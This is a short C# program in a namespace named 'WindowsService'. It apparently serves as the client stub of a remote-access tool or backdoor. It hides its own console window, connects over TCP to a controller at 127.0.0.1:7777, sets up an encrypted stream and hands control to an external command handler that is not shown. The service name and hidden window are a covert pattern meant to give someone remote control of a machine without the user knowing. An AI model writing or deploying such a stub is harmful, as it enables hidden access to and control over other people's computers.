using Client3;
using System;
using WindowsService;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;





namespace WindowsService
{
    class Program
    {   
        
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        
        const int SW_HIDE = 0;
        
       
        

        
        static void Main(string[] args)
        {   
            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);

            var tcpClient = new TcpClient();
            tcpClient.Connect("127.0.0.1", 7777);

            var stream = tcpClient.GetStream();
            stream.InitializeEncryption(isServer: false);
            
            new Handle().Handler(stream);
            
            
        }
    }
}
